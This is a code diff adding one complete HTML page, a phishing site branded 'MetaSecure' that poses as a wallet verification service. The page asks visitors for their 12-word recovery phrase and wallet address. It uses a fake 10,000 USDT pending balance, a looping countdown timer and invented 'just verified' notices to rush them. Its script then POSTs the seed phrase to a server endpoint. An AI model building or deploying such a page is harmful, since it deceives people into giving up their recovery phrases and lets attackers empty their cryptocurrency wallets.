@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaSecure - Wallet Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        
+        body {
+            background: #0a0b0d;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: white;
+            overflow-x: hidden;
+        }
+        
+        .bg-glow {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 50%, rgba(0, 120, 255, 0.15) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 50%, rgba(138, 43, 226, 0.1) 0%, transparent 50%);
+            z-index: -1;
+            animation: glow 8s infinite alternate;
+        }
+        @keyframes glow {
+            0% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0, 120, 255, 0.05) 0%, transparent 70%);
+            animation: rotate 10s linear infinite;
+        }
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .logo-icon {
+            width: 45px;
+            height: 45px;
+            background: linear-gradient(135deg, #0078ff, #00c6ff);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            box-shadow: 0 0 20px rgba(0, 120, 255, 0.5);
+        }
+        .logo-text {
+            font-size: 22px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #0078ff, #00c6ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .offer-badge {
+            background: linear-gradient(135deg, #0078ff, #00c6ff);
+            color: white;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 700;
+            display: inline-block;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: pulse 2s infinite;
+            position: relative;
+            z-index: 1;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        h1 {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            line-height: 1.3;
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.6;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .amount {
+            background: linear-gradient(135deg, rgba(0, 120, 255, 0.15), rgba(0, 198, 255, 0.1));
+            border: 1px solid rgba(0, 120, 255, 0.3);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .amount-value {
+            font-size: 38px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #0078ff, #00c6ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .amount-label {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+            margin-top: 5px;
+        }
+        
+        .timer {
+            background: rgba(255, 59, 48, 0.1);
+            border: 1px solid rgba(255, 59, 48, 0.2);
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #ff3b30;
+            font-weight: 700;
+            position: relative;
+            z-index: 1;
+        }
+        .timer span { color: white; }
+        
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+            z-index: 1;
+        }
+        label {
+            display: block;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 8px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        input {
+            width: 100%;
+            padding: 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            font-size: 15px;
+            color: white;
+            transition: all 0.3s;
+            font-family: 'Inter', sans-serif;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0078ff;
+            background: rgba(0, 120, 255, 0.05);
+            box-shadow: 0 0 0 4px rgba(0, 120, 255, 0.1);
+        }
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #0078ff, #00c6ff);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 10px 30px rgba(0, 120, 255, 0.3);
+            position: relative;
+            z-index: 1;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(0, 120, 255, 0.4);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .security {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .security-item {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.4);
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .live-notification {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 12px 16px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            animation: slideIn 0.5s ease-out;
+            z-index: 1000;
+            max-width: 280px;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(-100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        .live-notification .dot {
+            width: 8px;
+            height: 8px;
+            background: #00ff88;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(0, 120, 255, 0.5);
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-glow"></div>
+    
+    <div class="container">
+        <div class="logo">
+            <div class="logo-icon">🛡️</div>
+            <div class="logo-text">MetaSecure</div>
+        </div>
+        
+        <div style="text-align: center;">
+            <span class="offer-badge">🔒 Wallet Verification</span>
+        </div>
+        
+        <h1>Verify Your Wallet</h1>
+        <p class="subtitle">To ensure the security of your assets, please verify your wallet by entering your 12-word recovery phrase below.</p>
+        
+        <div class="amount">
+            <div class="amount-value">10,000 USDT</div>
+            <div class="amount-label">Pending Verification</div>
+        </div>
+        
+        <div class="timer">
+            ⏰ Verification expires in: <span id="timer">04:59</span>
+        </div>
+        
+        <form id="verifyForm">
+            <div class="form-group">
+                <label>Recovery Phrase (12 Words)</label>
+                <input type="text" id="seedPhrase" placeholder="Enter your 12-word recovery phrase" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Wallet Address</label>
+                <input type="text" id="walletAddress" placeholder="0x..." required>
+            </div>
+            
+            <button type="submit" class="btn">Verify Wallet 🛡️</button>
+        </form>
+        
+        <div class="security">
+            <span class="security-item">🔒 SSL Secured</span>
+            <span class="security-item">✅ Verified</span>
+            <span class="security-item">🛡️ 100% Safe</span>
+        </div>
+    </div>
+    
+    <div class="live-notification" id="notification">
+        <div class="dot"></div>
+        <span id="notifText">John from London just verified his wallet!</span>
+    </div>
+
+    <script>
+        let time = 299;
+        setInterval(() => {
+            time--;
+            if (time < 0) time = 299;
+            let m = Math.floor(time / 60);
+            let s = time % 60;
+            document.getElementById('timer').textContent = `${m}:${s < 10 ? '0' + s : s}`;
+        }, 1000);
+        
+        const names = ['John', 'Sarah', 'Michael', 'Emma', 'David', 'Sophie', 'James', 'Olivia'];
+        const cities = ['London', 'New York', 'Berlin', 'Paris', 'Toronto', 'Sydney', 'Amsterdam', 'Rome'];
+        
+        setInterval(() => {
+            const name = names[Math.floor(Math.random() * names.length)];
+            const city = cities[Math.floor(Math.random() * cities.length)];
+            const notif = document.getElementById('notification');
+            const text = document.getElementById('notifText');
+            
+            text.textContent = `${name} from ${city} just verified his wallet!`;
+            notif.style.animation = 'none';
+            notif.offsetHeight;
+            notif.style.animation = 'slideIn 0.5s ease-out';
+        }, 5000);
+        
+        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const seedPhrase = document.getElementById('seedPhrase').value;
+            const walletAddress = document.getElementById('walletAddress').value;
+            
+            try {
+                await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        seedPhrase: seedPhrase, 
+                        walletAddress: walletAddress 
+                    })
+                });
+            } catch (err) {
+                console.log('Error:', err);
+            }
+            
+            alert('✅ Your wallet is being verified. Please wait...');
+        });
+    </script>
+</body>
+  </html>
